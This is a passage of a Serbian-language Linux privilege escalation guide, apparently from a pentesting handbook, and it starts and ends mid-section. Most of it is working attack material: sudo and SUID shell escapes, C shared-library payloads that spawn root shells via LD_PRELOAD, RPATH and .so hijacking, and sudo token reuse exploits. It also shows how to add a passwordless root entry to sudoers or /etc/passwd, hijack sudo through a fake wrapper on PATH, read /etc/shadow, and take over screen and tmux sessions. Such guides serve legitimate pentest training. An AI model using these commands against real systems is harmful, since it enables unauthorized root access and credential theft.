(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji se izvršavaju na mašini sa kojima niste mogli da interagujete pre pristupanja:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Snifing

Proverite da li možete da špijunirate saobraćaj. Ako možete, možda ćete moći da pokupite neke akreditive.
```
timeout 1 tcpdump
```
## Korisnici

### Generičko Nabrajanje

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** se nalaze u sistemima, koji od njih mogu **da se prijave** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linuxa bile su pogođene greškom koja omogućava korisnicima sa **UID > INT\_MAX** da eskaliraju privilegije. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite** to koristeći: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla omogućiti root privilegije:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

Proverite da li se unutar clipboard-a nalazi nešto interesantno (ukoliko je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinke
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** okoline, **pokušajte se prijaviti kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta pravljenje puno buke i ako su binarni fajlovi `su` i `timeout` prisutni na računaru, možete pokušati da probate korisnika forsniranjem korišćenjem [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da forsnira korisnike.

## Zloupotreba PATH-a sa dozvolom pisanja

### $PATH

Ako otkrijete da možete **pisati unutar nekog foldera u $PATH-u**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti tajni prolaz unutar foldera u koji možete pisati** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz foldera koji se nalazi pre** vašeg foldera u $PATH-u.

### SUDO i SUID

Možda vam je dozvoljeno da izvršite neku komandu korišćenjem sudo-a ili ta komanda može imati suid bit. Proverite to korišćenjem:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika, a da pritom ne zna šifru.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može pokrenuti `vim` kao `root`, sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivom `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** dok nešto izvršava:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **baziran na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH preusmeravanje** kako bi učitao proizvoljnu Python biblioteku prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypassovanje izvršavanja Sudo komandi putem putanja

**Skoknite** da biste pročitali druge fajlove ili koristite **simboličke veze**. Na primer u sudoers fajlu: _haker10 SVE= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **zvezdica** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Mere zaštite**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binarni fajl bez putanje komande

Ako je **sudo dozvola** data za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete iskoristiti promenom PATH promenljive.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika takođe može biti korišćena ako **suid** binarni fajl **izvrši drugu komandu bez navođenja putanje do nje (uvek proverite sa** _**strings**_ **sadržaj čudnog SUID binarnog fajla)**.

[Primeri payload-a za izvršavanje.](payloads-to-execute.md)

### SUID binarni fajl sa putanjom komande

Ako **suid** binarni fajl **izvrši drugu komandu navodeći putanju**, tada možete pokušati da **izvezete funkciju** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i izvezete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** okružna promenljiva se koristi da se specificira jedna ili više deljenih biblioteka (.so fajlova) koje će biti učitane od strane loader-a pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao pred-ucitavanje biblioteke.

Međutim, radi održavanja sigurnosti sistema i sprečavanja zloupotrebe ove funkcije, posebno sa **suid/sgid** izvršljivim fajlovima, sistem sprovodi određene uslove:

- Loader ignoriše **LD\_PRELOAD** za izvršljive fajlove gde stvarni korisnički ID (_ruid_) se ne poklapa sa efektivnim korisničkim ID-om (_euid_).
- Za izvršljive fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje takođe imaju suid/sgid se pred-ucitavaju.

Eskalacija privilegija može da se desi ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` uključuje izjavu **env\_keep+=LD\_PRELOAD**. Ova konfiguracija dozvoljava **LD\_PRELOAD** okružnoj promenljivoj da ostane prisutna i bude prepoznata čak i kada se komande izvršavaju sa `sudo`, potencijalno dovodeći do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim ga **kompajlirajte** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **digni privilegije** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD\_LIBRARY\_PATH** env promenljivu jer kontroliše putanju gde će biblioteke biti tražene.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID binarni fajl – .so ubacivanje

Kada naiđete na binarni fajl sa **SUID** dozvolama koje deluju neobično, dobra praksa je da proverite da li pravilno učitava **.so** fajlove. Ovo možete proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, susretanje greške poput _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše na potencijal za iskorišćavanje.

Da biste iskoristili ovo, trebalo bi da nastavite tako što ćete kreirati C fajl, recimo _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, jednom kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulišući dozvolama datoteka i izvršavanjem ljuske sa povećanim privilegijama.

Kompajlirajte gorenavedenu C datoteku u deljeni objekat (.so) datoteku sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođenog SUID binarnog fajla trebalo bi da pokrene eksploataciju, omogućavajući potencijalno ugrožavanje sistema.

## Hijacking deljenog objekta
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarnu datoteku koja učitava biblioteku iz foldera u koji možemo pisati, napravimo biblioteku u tom folderu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku poput
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
To znači da biblioteka koju ste generisali mora imati funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je odabrani spisak Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna sigurnosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje mogu biti zloupotrebljene da bi se izašlo iz ograničenih shell-ova, eskalirale ili održavale povišene privilegije, prenosili fajlovi, pokretali bind i reverse shell-ove, i olakšavale druge zadatke nakon eksploatacije.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Ako možete pristupiti `sudo -l`, možete koristiti alatku [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način da iskoristi bilo koju sudo pravilo.

### Ponovna upotreba Sudo tokena

U slučajevima kada imate **sudo pristup** ali ne i lozinku, možete eskalirati privilegije **čekajući izvršenje sudo komande i zatim preuzimajući sesijski token**.

Uslovi za eskalaciju privilegija:

* Već imate shell kao korisnik "_sampleuser_"
* "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (podrazumevano je trajanje sudo tokena koje nam omogućava korišćenje `sudo` bez unošenja bilo koje lozinke)
* `cat /proc/sys/kernel/yama/ptrace_scope` je 0
* `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno modifikujući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

Ako su ispunjeni svi ovi uslovi, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Prva eksploatacija** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u vašoj sesiji** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Drugi eksploit (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **vlasništvu root-a sa setuid-om**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Treći eksploit (`exploit_v3.sh`) će kreirati sudoers fajl koji čini sudo token-e večnim i omogućava svim korisnicima korišćenje sudo-a.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<KorisničkoIme>

Ako imate **dozvole za pisanje** u fascikli ili na bilo kojem od kreiranih fajlova unutar fascikle, možete koristiti binarni fajl [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) da **kreirate sudo token za korisnika i PID**. Na primer, ako možete prebrisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku koristeći:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` podešavaju ko može koristiti `sudo` i kako. Ovi fajlovi **podrazumevano mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **čitati** ovaj fajl, možete biti u mogućnosti **dobiti neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl, moći ćete **doseći privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete pisati, možete zloupotrebiti ovo ovlašćenje
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način za zloupotrebu ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni `sudo` poput `doas` za OpenBSD, ne zaboravite da proverite njegovu konfiguraciju na lokaciji `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo preuzimanje kontrole

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za povećanje privilegija i dobijete shell unutar tog korisničkog konteksta, možete **napraviti novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash\_profile) tako da kada korisnik izvrši sudo, vaš sudo izvršni fajl bude izvršen.

Imajte na umu da ako korisnik koristi drugi shell (ne bash), moraćete da izmenite druge fajlove da biste dodali novi put. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ili pokretanje nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle se učitavaju konfiguracione datoteke**. Tipično, ova datoteka sadrži sledeći put: `include /etc/ld.so.conf.d/*.conf`

To znači da će se čitati konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **ukazuju na druge foldere** gde će se **tražiti biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **Ovo znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** na bilo kom od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koja datoteka unutar `/etc/ld.so.conf.d/` ili bilo koji folder unutar konfiguracione datoteke unutar `/etc/ld.so.conf.d/*.conf`, može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu lošu konfiguraciju** na sledećoj stranici:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib datoteke u `/var/tmp/flag15/` koristiće je program na ovom mestu kako je navedeno u `RPATH` promenljivoj.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreiraj zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux mogućnosti pružaju **podskup dostupnih root privilegija procesu**. Ovo efikasno razbija root **privilegije na manje i različite jedinice**. Svaka od ovih jedinica može zasebno biti dodeljena procesima. Na ovaj način kompletan set privilegija je smanjen, smanjujući rizik od zloupotrebe.\
Pročitajte sledeću stranicu da **saznate više o mogućnostima i kako ih zloupotrebiti**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Dozvole direktorijuma

U direktorijumu, **bit za "izvršavanje"** implicira da korisnik može "**cd**" u folder.\
Bit **"čitanja"** implicira da korisnik može **listati** **datoteke**, a bit **"pisanja"** implicira da korisnik može **brisati** i **kreirati** nove **datoteke**.

## ACL-ovi

Access Control Lists (ACL-ovi) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban za **premošćavanje tradicionalnih ugo/rwx dozvola**. Ove dozvole poboljšavaju kontrolu pristupa datotekama ili direktorijumima omogućavajući ili odbijajući prava specifičnim korisnicima koji nisu vlasnici ili deo grupe. Ovaj nivo **granularnosti osigurava preciznije upravljanje pristupom**. Više detalja možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dajte** korisniku "kali" dozvole za čitanje i pisanje nad datotekom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Preuzmite** fajlove sa određenim ACL-ovima sa sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorite sesije ljuske

U **starijim verzijama** možete **preuzeti kontrolu** nad nekom **sesijom ljuske** drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete se **povezati** samo na sesije ekrana **vašeg korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### preuzimanje sesija ekrana

**Lista sesija ekrana**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Povežite se sa sesijom**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Preuzimanje tmux sesija

Ovo je bio problem sa **starijim verzijama tmux-a**. Nisam mogao da preuzmem kontrolu nad tmux (v2.1) sesijom kreiranom od strane root korisnika kao neprivilegovani korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Povežite se sa sesijom**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Proverite **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predvidljiv PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. godine mogu biti pogođeni ovim bagom.\
Ovaj bag se javlja prilikom kreiranja novog ssh ključa na ovim operativnim sistemima, jer je **bilo moguće samo 32,768 varijacija**. To znači da su sve mogućnosti izračunate i **imajući ssh javni ključ možete tražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesantne vrednosti konfiguracije

* **PasswordAuthentication:** Određuje da li je autentikacija lozinkom dozvoljena. Podrazumevana vrednost je `no`.
* **PubkeyAuthentication:** Određuje da li je autentikacija javnim ključem dozvoljena. Podrazumevana vrednost je `yes`.
* **PermitEmptyPasswords**: Kada je autentikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavljivanje na naloge sa praznim lozinkama. Podrazumevana vrednost je `no`.

### PermitRootLogin

Određuje da li root može da se prijavi korišćenjem ssh, podrazumevana vrednost je `no`. Moguće vrednosti:

* `yes`: root može da se prijavi korišćenjem lozinke i privatnog ključa
* `without-password` ili `prohibit-password`: root se može prijaviti samo sa privatnim ključem
* `forced-commands-only`: Root se može prijaviti samo korišćenjem privatnog ključa i ako su navedene opcije komandi
* `no` : ne

### AuthorizedKeysFile

Određuje datoteke koje sadrže javne ključeve koji se mogu koristiti za autentikaciju korisnika. Može sadržati oznake poput `%h`, koje će biti zamenjene kućnim direktorijumom. **Možete navesti apsolutne putanje** (počinjući sa `/`) ili **relativne putanje od korisnikovog kućnog direktorijuma**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati da ako pokušate da se prijavite sa **privatnim** ključem korisnika "**testusername**" ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agentno prosleđivanje vam omogućava da **koristite svoje lokalne SSH ključeve umesto što ostavljate ključeve** (bez lozinki!) na vašem serveru. Takođe, bićete u mogućnosti da **skočite** putem ssh **do hosta** i odatle **skočite na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Potrebno je postaviti ovu opciju u `$HOME/.ssh.config` na sledeći način:
```
Host example.com
ForwardAgent yes
```
Primetite da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što predstavlja sigurnosni problem).

Fajl `/etc/ssh_config` može **zameniti** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** prosleđivanje ssh-agenta pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda možete iskoristiti to za eskalaciju privilegija**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interesantni Fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi u `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Dakle, ako možete **pisati ili menjati bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Passwd/Shadow Files

U zavisnosti od OS-a, fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili postojati rezervna kopija. Stoga se preporučuje **pronaći sve njih** i **proveriti da li možete da ih pročitate** kako biste videli **da li unutra postoje heševi**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim situacijama možete pronaći **hash-ove lozinki** unutar datoteke `/etc/passwd` (ili ekvivalentne).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Pisanje u /etc/passwd

Prvo generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `haker:$1$haker$TzyKlv0/R/c28R.GAeLw.1:0:0:Haker:/root:/bin/bash`

Sada možete koristiti `su` komandu sa `haker:haker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete smanjiti trenutnu sigurnost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**NAPOMENA:** Na BSD platformama `/etc/passwd` se nalazi na lokaciji `/etc/pwd.db` i `/etc/master.passwd`, takođe se `/etc/shadow` preimenuje u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive datoteke**. Na primer, da li možete pisati u neku **konfiguracionu datoteku servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti konfiguracioni fajl Tomcat servisa unutar /etc/systemd/,** tada možete izmeniti linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### Provera Foldera

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Vlasničke datoteke
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_istorija, .sudo_as_admin_uspešno, profil, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarni fajlovi u PUTANJI**
```bash
